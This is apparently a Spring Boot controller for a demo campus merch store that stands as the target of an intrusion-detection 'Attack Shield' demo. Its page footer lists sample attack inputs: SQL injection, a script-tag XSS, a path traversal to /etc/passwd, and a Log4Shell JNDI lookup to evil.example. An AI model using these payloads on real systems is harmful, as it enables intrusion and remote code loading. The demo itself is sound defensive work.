package edu.atlas.shield.web;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.stream.Collectors;

/**
 * The "victim": an ordinary campus merch store. Every request to it passes through ShieldFilter first.
 * Server-rendered so the search box on every page sends real query strings for the shield to inspect.
 */
@RestController
public class ShopController {

    record Product(int id, String name, String category, int rupees, String blurb, String art, String tint) {}

    static final List<Product> CATALOG = List.of(
            new Product(1, "Campus hoodie", "Apparel", 1499, "Heavyweight fleece, kangaroo pocket, embroidered crest on the chest.", "shirt", "#146C43"),
            new Product(2, "Lab notebook, A4", "Stationery", 249, "200 numbered pages, 5 mm grid, sewn binding that lies flat.", "book", "#2B4C9B"),
            new Product(3, "Steel bottle, 750 ml", "Essentials", 699, "Double-walled. Keeps chai hot through a three-hour lab.", "bottle", "#C2410C"),
            new Product(4, "Lab coat", "Apparel", 899, "Cotton twill, three pockets, cut to fit over a hoodie.", "shirt", "#E7E5E4"),
            new Product(5, "Lanyard and ID holder", "Essentials", 149, "Woven strap, breakaway clip, clear card sleeve.", "card", "#F2C230"),
            new Product(6, "Graph paper pad", "Stationery", 99, "50 tear-off sheets for circuits, plots and late-night proofs.", "book", "#0F766E"),
            new Product(7, "Canvas tote", "Essentials", 399, "Carries a laptop, two textbooks and a charger without complaint.", "bag", "#78716C"),
            new Product(8, "Scientific calculator", "Stationery", 1199, "417 functions, solar backup, exam-hall approved.", "calc", "#1F2937"));

    @GetMapping(value = {"/shop", "/shop/", "/shop/index.html"}, produces = "text/html;charset=UTF-8")
    public String home() {
        return page("Home", "", """
                <section class="hero">
                  <h1>Everything for the semester, in one place.</h1>
                  <p>Hoodies, lab gear and stationery. Pick up at the student centre.</p>
                </section>
                <h2 class="shelf">All products</h2>
                %s""".formatted(grid(CATALOG)));
    }

    @GetMapping(value = "/shop/search", produces = "text/html;charset=UTF-8")
    public String search(@RequestParam(defaultValue = "") String q) {
        String needle = q.trim().toLowerCase(Locale.ROOT);
        List<Product> hits = CATALOG.stream()
                .filter(p -> needle.isEmpty() || (p.name() + " " + p.category() + " " + p.blurb()).toLowerCase(Locale.ROOT).contains(needle))
                .toList();
        String shown = esc(q.trim());
        String body = hits.isEmpty()
                ? "<p class=\"empty\">Nothing matches “%s”. Try <a href=\"/shop/search?q=hoodie\">hoodie</a> or <a href=\"/shop/search?q=notebook\">notebook</a>.</p>".formatted(shown)
                : grid(hits);
        String title = needle.isEmpty() ? "All products" : "%d result%s for “%s”".formatted(hits.size(), hits.size() == 1 ? "" : "s", shown);
        return page("Search", q.trim(), "<h1 class=\"results\">" + title + "</h1>" + body);
    }

    @GetMapping(value = "/shop/product", produces = "text/html;charset=UTF-8")
    public ResponseEntity<String> product(@RequestParam(defaultValue = "") String id) {
        Optional<Product> found = parseId(id).flatMap(n -> CATALOG.stream().filter(p -> p.id() == n).findFirst());
        if (found.isEmpty()) {
            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(page("Not found", "",
                    "<p class=\"empty\">That product doesn’t exist. <a href=\"/shop/index.html\">Back to all products</a>.</p>"));
        }
        Product p = found.get();
        return ResponseEntity.ok(page(p.name(), "", """
                <article class="detail">
                  <div class="art big" style="--tint:%s">%s</div>
                  <div>
                    <p class="cat">%s</p>
                    <h1>%s</h1>
                    <p class="price">₹%,d</p>
                    <p>%s</p>
                    <form action="/shop/cart" method="get"><input type="hidden" name="add" value="%d"><button>Add to bag</button></form>
                  </div>
                </article>""".formatted(p.tint(), art(p.art()), esc(p.category()), esc(p.name()), p.rupees(), esc(p.blurb()), p.id())));
    }

    @GetMapping(value = "/shop/cart", produces = "text/html;charset=UTF-8")
    public String cart(@RequestParam(defaultValue = "") String add) {
        String msg = parseId(add).flatMap(n -> CATALOG.stream().filter(p -> p.id() == n).findFirst())
                .map(p -> "<strong>" + esc(p.name()) + "</strong> is in your bag.")
                .orElse("Your bag is empty.");
        return page("Your bag", "", "<h1 class=\"results\">Your bag</h1><p class=\"empty\">" + msg
                + " Checkout opens after the demo. <a href=\"/shop/index.html\">Keep browsing</a>.</p>");
    }

    private static Optional<Integer> parseId(String s) {
        try {
            return Optional.of(Integer.parseInt(s.trim()));
        } catch (NumberFormatException e) {
            return Optional.empty();
        }
    }

    private static String grid(List<Product> products) {
        return products.stream().map(p -> """
                <a class="item" href="/shop/product?id=%d">
                  <div class="art" style="--tint:%s">%s</div>
                  <span class="cat">%s</span>
                  <span class="name">%s</span>
                  <span class="price">₹%,d</span>
                </a>""".formatted(p.id(), p.tint(), art(p.art()), esc(p.category()), esc(p.name()), p.rupees()))
                .collect(Collectors.joining("", "<div class=\"grid\">", "</div>"));
    }

    private static String page(String title, String query, String main) {
        return """
                <!doctype html>
                <html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
                <title>%s · Campus Store</title><link rel="stylesheet" href="/shop/shop.css?v=2">
                <link rel="icon" href="data:image/svg+xml,%%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%%3E%%3Cpath d='M4 4h24v14a12 12 0 0 1-24 0z' fill='%%23146C43'/%%3E%%3Cpath d='M4 18h24a12 12 0 0 1-24 0z' fill='%%23F2C230'/%%3E%%3C/svg%%3E"></head>
                <body>
                <header class="top">
                  <a class="brand" href="/shop/index.html"><span class="crest" aria-hidden="true"></span>Campus Store</a>
                  <form class="search" action="/shop/search" method="get" role="search">
                    <input name="q" value="%s" placeholder="Search hoodies, notebooks, bottles…" aria-label="Search products">
                    <button>Search</button>
                  </form>
                  <nav><a href="/shop/search?q=apparel">Apparel</a><a href="/shop/search?q=stationery">Stationery</a><a href="/shop/search?q=essentials">Essentials</a></nav>
                </header>
                <main>%s</main>
                <footer>
                  <p>Open 9 to 5 at the student centre. This store is a demo target guarded by Attack Shield.</p>
                  <details><summary>Testing the shield?</summary>
                    <p>Type any of these into the search box, then watch the projector:</p>
                    <ul><li><code>' or 1=1--</code></li><li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
                    <li><code>../../etc/passwd</code></li><li><code>${jndi:ldap://evil.example/a}</code></li></ul>
                  </details>
                </footer>
                </body></html>""".formatted(esc(title), esc(query), main);
    }

    private static String esc(String s) { return HtmlUtils.htmlEscape(s); }

    /** Flat product drawings; colour comes from --tint so one shape serves several products. */
    private static String art(String kind) {
        String shape = switch (kind) {
            case "shirt" -> "<path d='M38 18 L26 24 L14 40 L24 48 L30 42 L30 86 L70 86 L70 42 L76 48 L86 40 L74 24 L62 18 Q50 30 38 18 Z' fill='var(--tint)' stroke='rgba(0,0,0,.28)' stroke-width='1.5' stroke-linejoin='round'/><path d='M40 60 h20 v12 h-20 z' fill='rgba(255,255,255,.18)'/>";
            case "book" -> "<rect x='26' y='14' width='48' height='72' rx='3' fill='var(--tint)'/><rect x='26' y='14' width='8' height='72' fill='rgba(0,0,0,.18)'/><rect x='42' y='30' width='24' height='4' fill='rgba(255,255,255,.6)'/>";
            case "bottle" -> "<rect x='42' y='10' width='16' height='10' rx='2' fill='#44403C'/><rect x='34' y='20' width='32' height='68' rx='10' fill='var(--tint)'/><rect x='38' y='30' width='5' height='44' rx='2' fill='rgba(255,255,255,.3)'/>";
            case "card" -> "<path d='M38 8 L50 40 L62 8' stroke='var(--tint)' stroke-width='6' fill='none'/><rect x='30' y='40' width='40' height='52' rx='4' fill='#fff' stroke='#D6D3D1' stroke-width='2'/><circle cx='50' cy='58' r='8' fill='var(--tint)'/><rect x='38' y='72' width='24' height='4' fill='#A8A29E'/>";
            case "bag" -> "<path d='M38 34 Q38 16 50 16 Q62 16 62 34' stroke='var(--tint)' stroke-width='5' fill='none'/><rect x='24' y='32' width='52' height='56' rx='3' fill='var(--tint)'/>";
            case "calc" -> "<rect x='28' y='10' width='44' height='80' rx='5' fill='var(--tint)'/><rect x='34' y='16' width='32' height='16' rx='2' fill='#A7F3D0'/>"
                    + "<g fill='rgba(255,255,255,.75)'><rect x='34' y='40' width='8' height='8'/><rect x='46' y='40' width='8' height='8'/><rect x='58' y='40' width='8' height='8'/><rect x='34' y='54' width='8' height='8'/><rect x='46' y='54' width='8' height='8'/><rect x='58' y='54' width='8' height='8'/><rect x='34' y='68' width='8' height='8'/><rect x='46' y='68' width='8' height='8'/><rect x='58' y='68' width='8' height='8' fill='#F2C230'/></g>";
            default -> "";
        };
        return "<svg viewBox='0 0 100 100' aria-hidden='true'>" + shape + "</svg>";
    }
}
